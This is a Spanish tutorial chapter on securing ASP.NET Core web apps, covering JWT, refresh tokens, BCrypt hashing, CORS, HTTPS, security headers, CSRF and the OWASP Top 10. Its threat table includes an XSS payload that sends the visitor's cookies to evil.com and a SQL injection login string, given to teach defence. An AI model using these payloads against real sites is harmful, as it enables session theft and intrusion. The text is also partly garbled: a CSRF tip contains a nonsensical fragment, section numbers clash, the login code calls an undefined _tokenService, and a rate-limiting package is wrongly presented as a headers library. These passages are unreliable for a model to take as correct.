- [24. Seguridad en Aplicaciones Web](#24-seguridad-en-aplicaciones-web)
  - [24.1. Autenticación: ¿Quién Eres?](#241-autenticación-quién-eres)
  - [24.2. Autorización: ¿Qué Puedes Hacer?](#242-autorización-qué-puedes-hacer)
  - [24.3. JWT: Estructura y Flujo](#243-jwt-estructura-y-flujo)
  - [24.4. Refresh Token: Renovar JWT](#244-refresh-token-renovar-jwt)
  - [24.5. Hashing de Contraseñas: BCrypt](#245-hashing-de-contraseñas-bcrypt)
  - [24.6. CORS: Orígenes Permitidos](#246-cors-orígenes-permitidos)
  - [24.7. HTTPS: Comunicación Segura](#247-https-comunicación-segura)
  - [24.8. Security Headers](#248-security-headers)
  - [24.9. CSRF: Cross-Site Request Forgery](#249-csrf-cross-site-request-forgery)
  - [24.10. OWASP Top 10](#2410-owasp-top-10)


# 24. Seguridad en Aplicaciones Web

> 💡 **Punto de partida:** Tu app funciona, pero... ¿es segura? ¿Alguien puede adivinar las contraseñas? ¿Puede un atacante enviar código malicioso en un formulario? ¿Qué pasa si interceptan las peticiones? La seguridad no es un "extra": es un requisito fundamental. Vamos a ver las principales amenazas y cómo proteger nuestra aplicación con autenticación, autorización, JWT, hashing, CORS y HTTPS.

En este tema profundizarás en seguridad web: autenticación vs autorización, JWT (estructura y flujo), hashing con BCrypt, CORS, HTTPS y el OWASP Top 10.

**Objetivos de aprendizaje:**

- Distinguir autenticación de autorización
- Entender la estructura y flujo de JWT
- Hashear contraseñas con BCrypt (nunca almacenar en texto plano)
- Configurar CORS para permitir orígenes específicos
- Entender HTTPS y los certificados SSL/TLS
- Conocer el OWASP Top 10 y las principales amenazas

## 24.1. Autenticación: ¿Quién Eres?

La **autenticación** verifica la identidad de un usuario. "¿Quién eres?"

```mermaid
sequenceDiagram
    participant U as 👤 Usuario
    participant S as ⚙️ Servidor

    U->>S: POST /login (usuario + contraseña)
    S->>S: Verifica credenciales en BD
    alt Credenciales correctas
        S-->>U: 200 OK + Token JWT
        Note over U: Guarda el token
        U->>S: GET /api/datos (Authorization: Bearer token)
        S->>S: Verifica token
        S-->>U: 200 OK + Datos
    else Credenciales incorrectas
        S-->>U: 401 Unauthorized
    end
```

### Métodos de autenticación

| Método | Descripción | Seguridad | Cuándo usar |
|--------|-------------|-----------|-------------|
| **Session/Cookie** | ID de sesión en cookie del servidor | Alta | Web apps tradicionales |
| **JWT** | Token firmado con datos del usuario | Alta | APIs REST, SPA, móviles |
| **OAuth 2.0** | Login con Google, GitHub, etc. | Muy alta | SSO, apps de terceros |
| **API Key** | Clave estática en cabecera | Media | APIs internas |

### Ejemplo de autenticación con JWT

```csharp
// Program.cs: Configurar autenticación JWT
builder.Services.AddAuthentication("Bearer")
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new()
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = "https://miapp.com",
            ValidAudience = "https://miapp.com",
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(builder.Configuration["JwtSettings:SecretKey"]!))
        };
    });

builder.Services.AddAuthorization();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

// Endpoint público
app.MapGet("/", () => "¡Bienvenido!");

// Endpoint protegido
app.MapGet("/api/datos-privados", () =>
{
    return new { Mensaje = "Estos son datos privados", Fecha = DateTime.Now };
}).RequireAuthorization();
```

> 📝 **Nota:** `UseAuthentication()` debe ir **antes** de `UseAuthorization()` en el pipeline de middleware. Si los pones al revés, la autorización no funcionará porque no sabe quién es el usuario.

## 24.2. Autorización: ¿Qué Puedes Hacer?

La **autorización** determina qué puede hacer un usuario una vez autenticado. "¿Qué permisos tienes?"

### RBAC: Role-Based Access Control

```csharp
// Configurar políticas de autorización
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));

    options.AddPolicy("AdminOrManager", policy =>
        policy.RequireRole("Admin", "Manager"));

    options.AddPolicy("MinAge18", policy =>
        policy.RequireClaim("age", claim =>
        {
            var value = claim.Value;
            return int.TryParse(value, out int age) && age >= 18;
        }));
});

// Usar en endpoints
app.MapGet("/api/admin/usuarios", () =>
{
    return new { Lista = "Todos los usuarios" };
}).RequireAuthorization("AdminOnly");

app.MapGet("/api/ventas", () =>
{
    return new { Ventas = "Datos de ventas" };
}).RequireAuthorization("AdminOrManager");

app.MapGet("/api/servicios-adultos", () =>
{
    return new { Contenido = "Contenido +18" };
}).RequireAuthorization("MinAge18");
```

### Autorización por claims personalizados

```csharp
// Endpoint que comprueba el nombre del usuario
app.MapGet("/api/perfil/{nombre}", (string nombre, ClaimsPrincipal user) =>
{
    var nombreUsuario = user.FindFirst(ClaimTypes.Name)?.Value;
    if (nombreUsuario != nombre)
        return Results.Forbid();

    return Results.Ok(new { Perfil = $"Bienvenido, {nombre}" });
}).RequireAuthorization();
```

> ⚠️ **Advertencia:** La autorización **no sustituye** a la autenticación. Siempre primero autenticas (`UseAuthentication`), luego autorizas (`UseAuthorization`). Un usuario no autenticado no tiene claims que comprobar.

## 24.3. JWT: Estructura y Flujo

Un **JWT** (JSON Web Token) es un token firmado que contiene datos del usuario. Tiene tres partes: `HEADER.PAYLOAD.SIGNATURE`.

### Estructura

```mermaid
graph LR
    H["📝 Header<br/>Algoritmo: HS256<br/>Tipo: JWT"] -->|"."| P["📦 Payload<br/>sub: 1<br/>name: Ana<br/>role: admin"]
    P -->|"."| S["🔐 Signature<br/>HMAC-SHA256(header.payload, secret)"]
    H --> J["🎫 JWT"]
    P --> J
    S --> J

    style H fill:#2196F3,color:#fff
    style P fill:#4CAF50,color:#fff
    style S fill:#f44336,color:#fff
    style J fill:#9C27B0,color:#fff
```

| Parte | Contenido | Ejemplo |
|-------|-----------|---------|
| **Header** | Algoritmo de firma y tipo | `{"alg":"HS256","typ":"JWT"}` |
| **Payload** | Claims (datos del usuario) | `{"sub":1,"name":"Ana","role":"admin","exp":1757164800}` |
| **Signature** | Firma para verificar integridad | `HMAC-SHA256(base64(header)+"."+base64(payload), secret)` |

### Flujo completo

```mermaid
sequenceDiagram
    participant C as 🖥️ Cliente
    participant S as ⚙️ Servidor

    C->>S: POST /auth/login {email, password}
    S->>S: Verificar credenciales
    S->>S: Crear JWT con claims
    S-->>C: 200 OK + JWT
    Note over C: Guardar JWT en memoria

    loop Cada petición autenticada
        C->>S: GET /api/datos
        Note over C: Authorization: Bearer eyJhbGci...
        S->>S: Verificar firma del JWT
        S->>S: Extraer claims
        S-->>C: 200 OK + Datos
    end
```

### Generar JWT en C#

```csharp
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;

public string GenerarToken(int userId, string email, string role)
{
    var key = new SymmetricSecurityKey(
        Encoding.UTF8.GetBytes(_jwtSettings.SecretKey));
    var credentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

    var claims = new[]
    {
        new Claim(ClaimTypes.NameIdentifier, userId.ToString()),
        new Claim(ClaimTypes.Email, email),
        new Claim(ClaimTypes.Role, role),
        new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
    };

    var token = new JwtSecurityToken(
        issuer: _jwtSettings.Issuer,
        audience: _jwtSettings.Audience,
        claims: claims,
        expires: DateTime.UtcNow.AddMinutes(_jwtSettings.ExpirationMinutes),
        signingCredentials: credentials
    );

    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

> ⚠️ **Advertencia:** **NUNCA** guardes datos sensibles en el payload de un JWT (contraseñas, números de tarjeta). El payload se puede **leer** (aunque no modificar sin la firma). Guarda solo datos no sensibles: ID, nombre, rol.

📌 **Ejemplo real:** Cuando haces login en Spotify, el servidor genera un JWT con tu ID y tipo de cuenta (free/premium). Cada vez que Spotify reproduce una canción, envía ese JWT para verificar que tienes derecho a escucharla.

## 24.4. Refresh Token: Renovar JWT

Un **Access Token** dura poco (15-30 minutos). Un **Refresh Token** dura días o semanas y permite obtener un nuevo Access Token sin pedir login de nuevo.

```mermaid
sequenceDiagram
    participant U as 👤 Usuario
    participant S as ⚙️ Servidor

    U->>S: POST /login (usuario + contraseña)
    S-->>U: Access Token (15min) + Refresh Token (7 días)

    U->>S: GET /api/datos (Authorization: Bearer access_token)
    S-->>U: 200 OK + Datos

    Note over U: ...15 minutos después...

    U->>S: GET /api/datos (Access Token EXPIRADO)
    S-->>U: 401 Unauthorized

    U->>S: POST /refresh (Refresh Token)
    S->>S: Verifica Refresh Token en BD
    S-->>U: Nuevo Access Token (15min)

    U->>S: GET /api/datos (nuevo Access Token)
    S-->>U: 200 OK + Datos

    style U fill:#2196F3,color:#fff
    style S fill:#4CAF50,color:#fff
```

> 💡 **Analogía — El Billete y el Carnet:**
> El **Access Token** es como un billete de una sesión de cine: dura poco (2 horas) y si se te acaba, no puedes entrar. El **Refresh Token** es como el carnet de socio del cine: cuando se te acaba la sesión, vas a taquilla, muestras el carnet y te dan una nueva entrada sin tener que hacer todo el proceso de compra de nuevo.

```csharp
// Refresh Token: renovar Access Token
[HttpPost("refresh")]
public async Task<IActionResult> Refresh([FromBody] RefreshRequest request)
{
    // 1. Verificar que el Refresh Token existe y no ha expirado
    var refreshToken = await _context.RefreshTokens
        .FirstOrDefaultAsync(t => t.Token == request.Token && !t.IsRevoked);

    if (refreshToken is null || refreshToken.ExpiresAt < DateTime.UtcNow)
        return Unauthorized("Refresh Token inválido o expirado");

    // 2. Generar nuevo Access Token
    var usuario = await _userManager.FindByIdAsync(refreshToken.UserId);
    var newAccessToken = GenerateJwtToken(usuario);

    // 3. Generar nuevo Refresh Token (rotación)
    var newRefreshToken = CreateRefreshToken(usuario.Id);
    refreshToken.IsRevoked = true; // Revocar el antiguo
    await _context.SaveChangesAsync();

    return Ok(new { AccessToken = newAccessToken, RefreshToken = newRefreshToken.Token });
}
```

> ⚠️ **Advertencia:** Usa **rotación de Refresh Tokens** — cada vez que se usa, se revoca el antiguo y se genera uno nuevo. Así, si alguien roba un Refresh Token y lo usa, el usuario legítimo se dará cuenta (su token dejó de funcionar).

### Tabla comparativa: JWT vs Session/Cookie

| Característica | JWT | Session/Cookie |
|----------------|-----|----------------|
| **Dónde se guarda** | Cliente (localStorage, cookie) | Servidor (memoria, BD) |
| **Escalabilidad** | ✅ Sin estado (stateless) | ❌ Requiere sesión en servidor |
| **Revocación** | ❌ Difícil (hasta que expire) | ✅ Fácil (borrar sesión) |
| **Rendimiento** | ✅ Sin consultas a BD | ❌ Consulta a BD cada petición |
| **Tamaño** | ⚠️ Mayor (payload completo) | ✅ Solo ID de sesión |
| **Seguridad** | ⚠️ Robo de token = acceso completo | ✅ Cookie con HttpOnly/Secure |
| **Uso típico** | APIs REST, SPA, móviles | Web apps tradicionales, SSR |

## 24.5. Hashing de Contraseñas: BCrypt

**NUNCA** almacenes contraseñas en texto plano. Usa **hashing** con un algoritmo seguro como **BCrypt**.

### Instalación

```bash
dotnet add package BCrypt.Net-Next
```

### Hashear y verificar

```csharp
using BCrypt.Net;

public class PasswordService
{
    // Hashear contraseña (para guardar en BD)
    public string HashPassword(string password)
    {
        return BCrypt.Net.BCrypt.HashPassword(password);
        // Genera algo como: $2a$11$LJ3m4ks1e4z1w5x5z5x5z...
    }

    // Verificar contraseña (para login)
    public bool VerifyPassword(string password, string hashedPassword)
    {
        return BCrypt.Net.BCrypt.Verify(password, hashedPassword);
        // Compara la contraseña con el hash almacenado
    }
}
```

### Ejemplo completo con registro y login

```csharp
public class AuthService(IPersonaRepository repository, PasswordService passwordService, TokenService tokenService) : IAuthService
{
    public async Task<Result<string>> RegisterAsync(string nombre, string email, string password)
    {
        // Verificar si el email ya existe
        if (await repository.GetByEmailAsync(email) is not null)
            return Result.Failure<string>("El email ya está registrado");

        // Hashear la contraseña
        string hashedPassword = passwordService.HashPassword(password);

        // Guardar usuario
        var persona = new Persona
        {
            Nombre = nombre,
            Email = email,
            PasswordHash = hashedPassword
        };

        await repository.AddAsync(persona);

        // Generar token
        string token = tokenService.GenerarToken(persona.Id, persona.Email, "User");
        return Result.Success(token);
    }

    public async Task<Result<string>> LoginAsync(string email, string password)
    {
        // Buscar usuario
        var persona = await repository.GetByEmailAsync(email);
        if (persona is null)
            return Result.Failure<string>("Credenciales incorrectas");

        // Verificar contraseña
        if (!passwordService.VerifyPassword(password, persona.PasswordHash))
            return Result.Failure<string>("Credenciales incorrectas");

        // Generar token
        string token = _tokenService.GenerarToken(persona.Id, persona.Email, "User");
        return Result.Success(token);
    }
}
```

> 💡 **Consejo:** BCrypt genera un salt (valor aleatorio) automáticamente. No necesitas gestionar el salt manualmente. Cada vez que hasheas la misma contraseña, obtienes un hash diferente (por el salt), pero `Verify` lo comprueba correctamente.

📌 **Ejemplo real:** Cuando Instagram guarda tu contraseña, la hashea con BCrypt. Cuando haces login, hashea la contraseña que introduces y la compara con el hash almacenado. Si coinciden, ¡accesas! Si no, "credenciales incorrectas".

## 24.5. CORS: Orígenes Permitidos

**CORS** (Cross-Origin Resource Sharing) controla qué dominios pueden acceder a tu API. Sin CORS, un script malicioso en `evil.com` no podría hacer peticiones a `tudominio.com`.

### Configuración

```csharp
// Program.cs
builder.Services.AddCors(options =>
{
    options.AddPolicy("PermitirFrontend", policy =>
    {
        policy.WithOrigins("http://localhost:3000", "https://miapp.com") // Orígenes permitidos
              .AllowAnyHeader()                                            // Cualquier cabecera
              .AllowAnyMethod()                                            // GET, POST, PUT, DELETE
              .AllowCredentials();                                         // Con cookies
    });
});

// Aplicar CORS (antes de UseAuthorization)
app.UseCors("PermitirFrontend");
```

### Políticas CORS

```csharp
// Permitir todos (solo desarrollo)
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowAll", policy =>
    {
        policy.AllowAnyOrigin()
              .AllowAnyHeader()
              .AllowAnyMethod();
    });
});

// Solo orígenes específicos
builder.Services.AddCors(options =>
{
    options.AddPolicy("Production", policy =>
    {
        policy.WithOrigins("https://miapp.com", "https://www.miapp.com")
              .WithHeaders("Authorization", "Content-Type")
              .WithMethods("GET", "POST", "PUT", "DELETE");
    });
});
```

> ⚠️ **Advertencia:** **NUNCA** uses `AllowAnyOrigin()` en producción. Eso permite que cualquier sitio web haga peticiones a tu API. Usa siempre orígenes específicos.

| Cabecera CORS | Descripción |
|---------------|-------------|
| `Access-Control-Allow-Origin` | Orígenes permitidos |
| `Access-Control-Allow-Methods` | Métodos HTTP permitidos |
| `Access-Control-Allow-Headers` | Cabeceras permitidas |
| `Access-Control-Allow-Credentials` | Permitir cookies |
| `Access-Control-Max-Age` | Tiempo de caché del preflight |

## 24.6. HTTPS: Comunicación Segura

**HTTPS** es HTTP con cifrado SSL/TLS. La "S" significa **Secure**.

```mermaid
graph LR
    C["🖥️ Cliente"] -->|"1. Hola, quiero hablar"| S["⚙️ Servidor"]
    S -->|"2. Aquí está mi certificado"| C
    C -->|"3. ¿Es de confianza? ✅"| C
    C -->|"4. Usemos esta clave"| S
    S -->|"5. 🔒 Datos cifrados"| C

    style C fill:#2196F3,color:#fff
    style S fill:#4CAF50,color:#fff
```

| HTTP | HTTPS |
|------|-------|
| Puerto 80 | Puerto 443 |
| Datos en texto plano | Datos cifrados (SSL/TLS) |
| Google lo marca "No seguro" | Google lo marca "Seguro" |

### Configurar HTTPS en ASP.NET Core

```csharp
// Program.cs
var builder = WebApplication.CreateBuilder(args);

// Redirigir HTTP a HTTPS
builder.Services.AddHttpsRedirection(options =>
{
    options.RedirectStatusCode = StatusCodes.Status307TemporaryRedirect;
    options.HttpsPort = 443;
});

var app = builder.Build();

app.UseHttpsRedirection();
```

> 💡 **Consejo:** Para desarrollo local, usa `dotnet dev-certs https` para generar un certificado autofirmado. En producción, usa Let's Encrypt (gratuito) o un certificado comercial.

## 24.8. Security Headers

Las **Security Headers** son cabeceras HTTP que protegen tu app de ataques comunes. Configúralas en ASP.NET Core:

```mermaid
graph TB
    subgraph HEADERS["Security Headers — Capas de Protección"]
        H1["X-Content-Type-Options<br/>nosniff"] --> H2["X-Frame-Options<br/>DENY"]
        H2 --> H3["X-XSS-Protection<br/>1; mode=block"]
        H3 --> H4["Strict-Transport-Security<br/>max-age=31536000"]
        H4 --> H5["Content-Security-Policy<br/>default-src 'self'"]
    end

    style HEADERS fill:#4CAF50,color:#fff
```

| Cabecera | Protege contra | Valor recomendado |
|----------|---------------|-------------------|
| `X-Content-Type-Options` | MIME sniffing (ejecutar JS como HTML) | `nosniff` |
| `X-Frame-Options` | Clickjacking (iframes ocultos) | `DENY` |
| `X-XSS-Protection` | XSS en navegadores antiguos | `1; mode=block` |
| `Strict-Transport-Security` | Fuerza HTTPS (HSTS) | `max-age=31536000; includeSubDomains` |
| `Content-Security-Policy` | XSS, inyección de scripts | `default-src 'self'` |
| `Referrer-Policy` | Filtración de URLs | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Acceso a cámara, micrófono, etc. | `camera=(), microphone=()` |

```csharp
// Configurar Security Headers en ASP.NET Core
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    context.Response.Headers.Append("X-XSS-Protection", "1; mode=block");
    context.Response.Headers.Append("Strict-Transport-Security",
        "max-age=31536000; includeSubDomains");
    context.Response.Headers.Append("Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'");
    context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
    context.Response.Headers.Append("Permissions-Policy",
        "camera=(), microphone=(), geolocation=()");
    await next();
});
```

> 💡 **Consejo:** Usa la librería `NWebsec` o `AspNetCoreRateLimit` para configurar headers de forma declarativa en vez de manual.

## 24.9. CSRF: Cross-Site Request Forgery

El **CSRF** es un ataque donde un sitio malicioso hace peticiones a tu app usando las credenciales del usuario (cookies) sin su consentimiento.

```mermaid
sequenceDiagram
    participant U as 👤 Víctima (logueada en tuapp.com)
    participant M as 🖥️ Sitio Malicioso (evil.com)
    participant S as ⚙️ Tu Servidor (tuapp.com)

    U->>M: Visita evil.com
    Note over M: evil.com tiene un formulario oculto<br/>que hace POST a tuapp.com
    M->>S: POST /transferir (con cookies de U)
    Note over S: Cookies válidas → ejecuta transferencia
    S-->>M: 200 OK
    Note over U: 😱 Usuario no se enteró

    style U fill:#2196F3,color:#fff
    style M fill:#f44336,color:#fff
    style S fill:#4CAF50,color:#fff
```

### Prevención con Anti-Forgery Tokens

```csharp
// Program.cs: Habilitar anti-forgery
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
    options.Cookie.Name = "CSRF-TOKEN";
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});

// En el formulario HTML
<form method="post">
    @Html.AntiForgeryToken()
    <input type="text" name="nombre" />
    <button type="submit">Enviar</button>
</form>

// En el endpoint
[HttpPost]
[ValidateAntiForgeryToken] // Verifica el token
public IActionResult Transferir([FromBody] TransferenciaRequest request)
{
    // Solo llega si el token es válido
    return Ok();
}
```

> 💡 **Consejo:** Para APIs SPA, usa tokens CSRF en cabeceras (no cookies). El于御览.ts de Angular, React o Vue envían el token en cada petición POST/PUT/DELETE.

### Tabla comparativa: CSRF vs XSS vs SQL Injection

| Amenaza | Qué hace | Ejemplo | Prevención |
|---------|----------|---------|------------|
| **CSRF** | Finge ser el usuario | Formulario oculto que transfiere dinero | Anti-Forgery Tokens |
| **XSS** | Inyecta JavaScript | `<script>document.location='evil.com?c='+document.cookie` | Sanitización + CSP |
| **SQL Injection** | Inyecta SQL | `' OR '1'='1` en un campo de login | Parámetros SQL |

## 24.10. OWASP Top 10

El **OWASP Top 10** es la lista de las 10 vulnerabilidades de seguridad más comunes en aplicaciones web.

| # | Vulnerabilidad | Descripción | Cómo prevenirla |
|---|---------------|-------------|-----------------|
| **A01** | Broken Access Control | Acceso no autorizado a recursos | Autorización en cada endpoint |
| **A02** | Cryptographic Failures | Datos sensibles mal protegidos | Cifrado en reposo y tránsito |
| **A03** | Injection | Inyección de código (SQL, XSS) | Validación + parametrización |
| **A04** | Insecure Design | Diseño sin seguridad | Threat modeling |
| **A05** | Security Misconfiguration | Configuración por defecto insegura | Hardening + configuración mínima |
| **A06** | Vulnerable Components | Librerías con CVEs conocidos | `dotnet list package --vulnerable` |
| **A07** | Auth Failures | Autenticación débil | MFA + rate limiting |
| **A08** | Data Integrity Failures | Fallo en verificación de datos | Firmas digitales |
| **A09** | Logging Failures | Logs insuficientes | Logging estructurado |
| **A10** | SSRF | Server-Side Request Forgery | Validar URLs de destino |

### Ejemplos de prevención

```csharp
// A03: SQL Injection — USAR PARÁMETROS, NUNCA CONCATENAR
// ❌ MALO
var query = $"SELECT * FROM Usuarios WHERE Email = '{email}'";

// ✅ BUENO
var query = "SELECT * FROM Usuarios WHERE Email = @Email";
command.Parameters.AddWithValue("@Email", email);

// A03: XSS — SANITIZAR ENTRADAS
// ❌ MALO: Permitir HTML
string input = "<script>alert('hacked')</script>";

// ✅ BUENO: Sanitizar
using System.Net;
string safe = WebUtility.HtmlEncode(input);

// A07: Rate Limiting
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("fixed", opt =>
    {
        opt.Window = TimeSpan.FromMinutes(1);
        opt.PermitLimit = 100; // Máximo 100 peticiones por minuto
    });
});
```

> 💡 **Consejo:** Para el examen, recuerda los 3 pilares de la seguridad web: **Confidencialidad** (solo los autorizados ven los datos), **Integridad** (los datos no se modifican), **Disponibilidad** (el servicio está accesible). Y la regla de oro: **NUNCA confíes en el cliente**.

---

**Resumen del punto:**

| Concepto | Descripción |
|----------|-------------|
| **Autenticación** | Verificar la identidad del usuario (¿quién eres?) |
| **Autorización** | Determinar qué puede hacer (¿qué permisos tienes?) |
| **JWT** | Token firmado con datos del usuario (Header.Payload.Signature) |
| **Refresh Token** | Token de larga duración para renovar JWT sin login |
| **BCrypt** | Algoritmo de hashing seguro para contraseñas |
| **CORS** | Control de orígenes permitidos para peticiones HTTP |
| **HTTPS** | HTTP con cifrado SSL/TLS |
| **Security Headers** | Cabeceras que protegen de XSS, clickjacking, sniffing |
| **CSRF** | Ataque que usa cookies del usuario sin su consentimiento |
| **OWASP Top 10** | Las 10 vulnerabilidades web más comunes |
| **SQL Injection** | Inyección de código SQL, se previene con parámetros |
| **XSS** | Cross-Site Scripting, se previene sanitizando entradas |
| **Rate Limiting** | Limitar peticiones por usuario/timeframe |

En el siguiente punto veremos un resumen de la Parte 2 y cómo todo conecta con ASP.NET Core en la Unidad 02.
